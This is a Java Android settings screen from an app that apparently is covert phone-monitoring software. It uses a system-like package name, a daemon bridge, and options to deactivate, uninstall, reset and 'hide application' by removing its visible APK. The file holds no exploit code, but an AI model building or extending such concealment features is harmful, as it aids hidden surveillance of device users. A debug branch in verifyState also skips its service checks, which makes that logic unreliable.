package com.fx;

import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.DialogInterface.OnClickListener;
import android.content.res.Resources;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.preference.Preference;
import android.preference.PreferenceActivity;
import android.preference.Preference.OnPreferenceClickListener;
import android.text.Html;
import android.view.View;
import android.widget.TextView;

import com.android.msecurity.R;
import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.GetProductInfoCommand;
import com.daemon_bridge.GetProductInfoCommandResponse;
import com.daemon_bridge.SendDeactivateCommand;
import com.daemon_bridge.SendDeactivateCommandResponse;
import com.daemon_bridge.SocketCommandBase;
import com.fx.util.Customization;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.timer.TimerBase;


@SuppressWarnings("unused")
public class ApplicationSettingsActivity extends PreferenceActivity {
	
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final String TAG = "ApplicationSettingsActivity";
	private static final int TIMEOUT = 120;
	
	private ProgressDialog mProgressDialog;
	private TimerBase mProgressDialogTimeOut;
	private Context mContext;
	private Handler mHandler;
	
	private RemoteCallingService mBoundRemoteCallingService;
	private ResetService mBoundResetService;
	
	private ServiceConnection mRemoteCallingServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundRemoteCallingService = ((RemoteCallingService.LocalBinder) service).getService();
			mBoundRemoteCallingService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundRemoteCallingService = null;
		}
	};
	
	private ServiceConnection mResetServiceConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mBoundResetService = ((ResetService.LocalBinder) service).getService();
			mBoundResetService.setHandler(mHandler);
			verifyState();
		}
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mBoundResetService = null;
		}
	};
	
	@Override
    protected void onStart() {
    	if (LOGV) FxLog.v(TAG, "onStart # ENTER ...[UI]");
    	super.onStart();
    	bindServices();
    }
    
    @Override
    protected void onStop() {
    	if (LOGV) FxLog.v(TAG, "onStop # ENTER ...[UI]");
    	
    	unbindServices();
    	dismissProgressDialog();
    	
    	super.onStop();
    }
    
    private void bindServices() {
    	if (mBoundRemoteCallingService == null) {
	    	bindService(new Intent(ApplicationSettingsActivity.this, RemoteCallingService.class), 
	    			mRemoteCallingServiceConn, BIND_AUTO_CREATE);
    	}
    	
    	if (mBoundResetService == null) {
	    	bindService(new Intent(ApplicationSettingsActivity.this, ResetService.class), 
	    			mResetServiceConn, BIND_AUTO_CREATE);
    	}
    }
    
    private void unbindServices() {
    	if (mBoundRemoteCallingService != null) {
	    	unbindService(mRemoteCallingServiceConn);
	    	mBoundRemoteCallingService = null;
    	}
    	
    	if (mBoundResetService != null) {
	    	unbindService(mResetServiceConn);
	    	mBoundResetService = null;
    	}
    }
    
    
	private void verifyState() {
		if (LOGV)
			FxLog.v(TAG, "verifyState # ENTER ...");

		else if (mBoundResetService.isRunning()) {
			if (LOGV)
				FxLog.v(TAG, "verifyState # Reset service is running ...");
			actionReset(false);
		}

		else if (mBoundRemoteCallingService.isRunning()) {
			if (LOGV)
				FxLog.v(TAG,  "verifyState # RemoteCalling service is running ...");
			
			showProgressDialog();
		} else {
			if (LOGV)
				FxLog.v(TAG, "verifyState # No running service");
		}

		if (LOGV)
			FxLog.v(TAG, "verifyState # EXIT ...");
	}

	private void actionReset(boolean startService) {
		if (LOGV)
			FxLog.v(TAG, "actionReset # ENTER ...");

		showProgressDialog();

		if (startService) {
			if (LOGV)
				FxLog.v(TAG, "actionReset # Start Reset service");
			startService(new Intent(ApplicationSettingsActivity.this,
					ResetService.class));
		}
		if (LOGV)
			FxLog.v(TAG, "actionReset # EXIT ...");
	}
	 
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		addPreferencesFromResource(R.layout.application_settings);
		mContext = this.getApplicationContext();
	    Resources packageResources = getResources();
	    
	    mHandler = new Handler() {
        	public void handleMessage(Message msg) {
        		processMessage(msg);
        	}
        };
        
	    IconPreferenceScreen currentSettingPreference = (IconPreferenceScreen) findPreference("key1");
        Drawable settingIcon = packageResources.getDrawable(android.R.drawable.ic_menu_manage);
        currentSettingPreference.setIcon(settingIcon);
        currentSettingPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			
			@Override
			public boolean onPreferenceClick(Preference preference) {
				Intent currentSettingsActivityIntent = new Intent(getApplicationContext(), CurrentSettingsActivity.class);
				startActivity(currentSettingsActivityIntent);
				return false;
			}
		});
        
        IconPreferenceScreen currentLastConnectionPreference = (IconPreferenceScreen) findPreference("key2");
        Drawable lastConnectionIcon = packageResources.getDrawable(android.R.drawable.ic_menu_recent_history);
        currentLastConnectionPreference.setIcon(lastConnectionIcon);
        currentLastConnectionPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			@Override
			public boolean onPreferenceClick(Preference preference) {
				Intent connectionHistoryActivityIntent = new Intent(getApplicationContext(), ConnectionHistoryActivity.class);
				startActivity(connectionHistoryActivityIntent);
				return false;
			}
		});
        
        IconPreferenceScreen currentDeactivatePreference = (IconPreferenceScreen) findPreference("key3");
        Drawable deactivateIcon = packageResources.getDrawable(android.R.drawable.ic_menu_close_clear_cancel);
        currentDeactivatePreference.setIcon(deactivateIcon);
        currentDeactivatePreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			
			@Override
			public boolean onPreferenceClick(Preference preference) {
				AlertDialog.Builder builder = new AlertDialog.Builder(ApplicationSettingsActivity.this);
				builder.setTitle(R.string.language_ui_label_deactivate_title);
				builder.setMessage(R.string.language_deactivation_warning).setPositiveButton(R.string.language_ui_label_ok, dialogClickListener)
				    .setNegativeButton(R.string.language_ui_label_cancel, dialogClickListener).show();
				return false;
			}
		});
        
        IconPreferenceScreen uninstallPreference = (IconPreferenceScreen) findPreference("key4");
        Drawable uninstallIcon = packageResources.getDrawable(android.R.drawable.ic_menu_delete);
        uninstallPreference.setIcon(uninstallIcon);
        uninstallPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			
			@Override
			public boolean onPreferenceClick(Preference preference) {
				if (LOGV) FxLog.v(TAG, "uninstall # ENTER ...");
				
				AlertDialog.Builder builder = new AlertDialog.Builder(ApplicationSettingsActivity.this);
				builder.setTitle(R.string.language_ui_label_uninstall);
				builder.setMessage(R.string.language_uninstall_warning)
					.setPositiveButton(R.string.language_ui_label_ok, new OnClickListener() {
						@Override
						public void onClick(DialogInterface dialog, int which) {
							showProgressDialog();
							
							Intent uninstall = new Intent(ApplicationSettingsActivity.this, RemoteCallingService.class);
							uninstall.setAction(RemoteCallingService.ACTION_REMOVE_ALL);
							startService(uninstall);							
						}
					} )
				    .setNegativeButton(R.string.language_ui_label_cancel, new OnClickListener() {
						@Override
						public void onClick(DialogInterface dialog, int which) {
							dialog.dismiss();
						}
					}).show();
				
				if (LOGV) FxLog.v(TAG, "uninstall # EXIT ...");
				return false;
			}
		});

        IconPreferenceScreen resetPreference = (IconPreferenceScreen) findPreference("key5");
        Drawable resetIcon = packageResources.getDrawable(android.R.drawable.ic_menu_revert);
        resetPreference.setIcon(resetIcon);
        resetPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			
			@Override
			public boolean onPreferenceClick(Preference preference) {
				if (LOGV) FxLog.v(TAG, "actionReset # ENTER ...");
		    	
		    	showProgressDialog();
		    	
		    	if (LOGV) FxLog.v(TAG, "actionReset # Start Reset service");
		    	startService(new Intent(ApplicationSettingsActivity.this, ResetService.class));
		    	
		    	if (LOGV) FxLog.v(TAG, "actionReset # EXIT ...");
				return false;
			}
		});
        
        IconPreferenceScreen hideApplicationPreference = (IconPreferenceScreen) findPreference("key6");
        Drawable hideApplicationIcon = packageResources.getDrawable(android.R.drawable.ic_menu_set_as);
        hideApplicationPreference.setIcon(hideApplicationIcon);
        hideApplicationPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			
			@Override
			public boolean onPreferenceClick(Preference preference) {
				showProgressDialog();
				
				Intent uninstall = new Intent(ApplicationSettingsActivity.this, RemoteCallingService.class);
				uninstall.setAction(RemoteCallingService.ACTION_REMOVE_APK);
				startService(uninstall);	
				return false;
			}
		});
        
        IconPreferenceScreen aboutPreference = (IconPreferenceScreen) findPreference("key7");
        Drawable aboutIcon = packageResources.getDrawable(android.R.drawable.ic_menu_info_details);
        aboutPreference.setIcon(aboutIcon);
        aboutPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
			
			@Override
			public boolean onPreferenceClick(Preference preference) {
				new UITask().execute(new GetProductInfoCommand());
				return false;
			}
		});
	}
	
	DialogInterface.OnClickListener dialogClickListener = new DialogInterface.OnClickListener() {
	    @Override
	    public void onClick(DialogInterface dialog, int which) {
	        switch (which){
	        case DialogInterface.BUTTON_POSITIVE:
	        	deactivate();
	            break;

	        case DialogInterface.BUTTON_NEGATIVE:
	            //No button clicked
	            break;
	        }
	    }
	};
	
	private void showProgressDialog() {
		if (LOGV) {
			FxLog.v(TAG, "showProgressDialog # ENTER ...");
		}

		if (mProgressDialog == null) {
			mProgressDialog = ProgressDialog.show(
					ApplicationSettingsActivity.this, "",
					FxResource.LANGUAGE_UI_MSG_PROCESSING_POLITE, true);

			resetProgressDialogTimeout();
		}
	}
	 
	 private void resetProgressDialogTimeout() {
	    	if (mProgressDialogTimeOut != null) {
	    		mProgressDialogTimeOut.stop();
	    		mProgressDialogTimeOut = null;
	    	}
	    	
	    	mProgressDialogTimeOut = new TimerBase() {
				
				@Override
				public void onTimer() {
					if (LOGV) {
						FxLog.v(TAG, "resetProgressDialogTimeout.onTimer # ENTER ...");
					}
					dismissProgressDialog();
					
					// Cannot do toast inside Thread that has not called Looper.prepare()
					Bundle data = new Bundle();
					data.putInt(UiHelper.BUNDLE_KEY_EVENT, UiHelper.EVENT_NOTIFY);
					data.putString(UiHelper.BUNDLE_KEY_TEXT, FxResource.LANGUAGE_PROCESS_NOT_RESPONDING);
					
					Message msg = new Message();
					msg.setData(data);
					mHandler.sendMessage(msg);
				}
			};
			
			mProgressDialogTimeOut.setTimerDurationMs(
					UiHelper.PROGRESS_DIALOG_TIMEOUT_LONG_MS);
			
			mProgressDialogTimeOut.start();
	 }
	 
	private void dismissProgressDialog() {
		if (LOGV)
			FxLog.v(TAG, "dismissProgressDialog # ENTER ...");

		Thread t = new Thread() {
			@Override
			public void run() {
				SystemClock.sleep(500);

				if (mProgressDialog != null) {
					mProgressDialog.dismiss();
					mProgressDialog = null;
				}

				// Cancel timeout timer
				if (mProgressDialogTimeOut != null) {
					mProgressDialogTimeOut.stop();
					mProgressDialogTimeOut = null;
				}
			}
		};
		t.start();
	}

 
    private void processMessage(Message msg) {
    	if (LOGV)
			FxLog.v(TAG, "processMessage # ENTER ...");
    	
		Bundle bundle = msg.getData();
		
		int event = bundle.getInt(UiHelper.BUNDLE_KEY_EVENT);
		
		switch (event) {
			case (UiHelper.EVENT_NOTIFY):
				if (LOGV) FxLog.v(TAG, "processMessage # event : EVENT_NOTIFY ");
				UiHelper.notifyUser(ApplicationSettingsActivity.this, bundle.getString(UiHelper.BUNDLE_KEY_TEXT));
				break;
			case (UiHelper.EVENT_UPDATE_PROGRESS):
				if (LOGV) FxLog.v(TAG, "processMessage # event : EVENT_UPDATE_PROGRESS ");
				setProgressDialogMessage(bundle.getString(UiHelper.BUNDLE_KEY_TEXT));
				break;
			case (UiHelper.EVENT_PROCESSING_DONE):
				if (LOGV) FxLog.v(TAG, "processMessage # event : EVENT_PROCESSING_DONE ");
				dismissProgressDialog();
				break;
			case (UiHelper.EVENT_RESET_VIEW):
				if (LOGV) FxLog.v(TAG, "processMessage # event : EVENT_RESET_VIEW");
				
				Intent intent = new Intent();
				intent.setClass(ApplicationSettingsActivity.this, MainActivity.class);
				startActivity(intent);
				finish();
				break;
		}
		
		if (LOGV)
			FxLog.v(TAG, "processMessage # EXIT ...");
	}
    
    private void setProgressDialogMessage(String message) {
    	if (mProgressDialog != null) {
			mProgressDialog.setMessage(message);
		}
    	resetProgressDialogTimeout();
    }
    
	private void deactivate() {
		View currentView = getCurrentFocus();

		if (currentView != null) {
			UiHelper.hideSoftInput(this, currentView);
		}
		
		new UITask().execute(new SendDeactivateCommand());
	}
	
	private String mErrorResponse = null;
	
	private class UITask extends AsyncTask<SocketCommandBase, Void, String> {
		private CommandResponseBase result = null;
		private ProgressDialog pDialog;
		
		protected void onPreExecute() {
			pDialog = ProgressDialog.show(ApplicationSettingsActivity.this, "", getString(R.string.language_ui_msg_processing_polite), true);
	    }
		
		  protected String doInBackground(final SocketCommandBase... socketCommandBase) {
		    	if (LOGV) FxLog.v(TAG, "UITask # doInBackground # START");
		    	
		    	ExecutorService executor = Executors.newCachedThreadPool();
		    	Callable<Void> task = new Callable<Void>() {
		    	   public Void call() {
		    		   if (LOGV) FxLog.v(TAG, "UITask # call # START");
		    		   
		    		   SocketCommandBase initSocketCommandBase = socketCommandBase[0];
		   	    	
			   			try {
			   				if (LOGV) FxLog.v(TAG, "UITask # before execute");
			           		result = initSocketCommandBase.execute();
			           		if (LOGV) FxLog.v(TAG, "UITask # after execute");
			           	}
			           	catch(Throwable t) {
			           		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + t.toString());
			           		mErrorResponse = t.getMessage();
			           	}
		   			
			   			if (LOGV) FxLog.v(TAG, "UITask # call # EXIT");
		   				return null;
		    	   }
		    	};
		    	
		    	Future<Void> future = executor.submit(task);
		    	
		    	try {
		    	   
		    		future.get(TIMEOUT, TimeUnit.SECONDS); 
		    	   if (LOGV) FxLog.v(TAG, "UITask # after exec");
		    	   
		    	} catch (TimeoutException ex) {
		    	   // handle the timeout
		    		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + ex.toString());
		    		mErrorResponse = "Operation timeout !";
		    		
		    	} catch (InterruptedException e) {
		    	   // handle the interrupts
		    		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + e.toString());
		    		mErrorResponse = e.getMessage();
		    		
		    	} catch (ExecutionException e) {
		    	   // handle other exceptions
		    		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + e.toString());
		    		mErrorResponse = e.getMessage();
		    		
		    	} finally {
		    	   //future.cancel(); // may or may not desire this
		    	}
	 			
				if (LOGV && result != null) FxLog.v(TAG, "UITask # doInBackground # result #" + result.toString());
				if (LOGV) FxLog.v(TAG, "UITask # doInBackground # EXIT");
		    	return null;
		    }

	    protected void onPostExecute(String outputMsg) {
	    	pDialog.dismiss();
	    	
	    	if(result != null)
	    		onPostExecuteTask(result);	
	    	else
	    		UiHelper.notifyUser(getApplicationContext(), mErrorResponse);
	    }
	}
	
	private void onPostExecuteTask(CommandResponseBase result) {
		if(result instanceof GetProductInfoCommandResponse) {
			GetProductInfoCommandResponse response =  (GetProductInfoCommandResponse)result;
			
			if(response.getResponseCode() == CommandResponseBase.SUCCESS) {
				View aboutView = getLayoutInflater().inflate(R.layout.about_dialog,null);
				TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
				
				String aboutFormat = getString(R.string.language_about_information);
				String productId = String.valueOf(response.getProductId());
				String version = response.getProductVersion();
				String html = String.format(aboutFormat, productId, version);
				CharSequence aMessage = Html.fromHtml(html);
				
				textView.setText(aMessage);
				AlertDialog.Builder builder = new AlertDialog.Builder(ApplicationSettingsActivity.this).setTitle(R.string.language_ui_label_about).setView(aboutView).setPositiveButton(R.string.language_ui_label_ok, null);
				builder.show();
			}
		}
		else if(result instanceof SendDeactivateCommandResponse) {
			SendDeactivateCommandResponse response =  (SendDeactivateCommandResponse)result;
			
			if(response.getResponseCode()  == CommandResponseBase.SUCCESS) {
				UiHelper.notifyUser(ApplicationSettingsActivity.this, getString(R.string.language_deactivation_success));
				
				Intent intent = new Intent();
				intent.setClass(ApplicationSettingsActivity.this, MainActivity.class);
				startActivity(intent);
				finish();	
			}
			else {
				String message = String.format("%s: %s", getString(R.string.language_activation_fail), response.getResponseMsg());
				UiHelper.notifyUser(ApplicationSettingsActivity.this, message);
			}
		}
	}
}

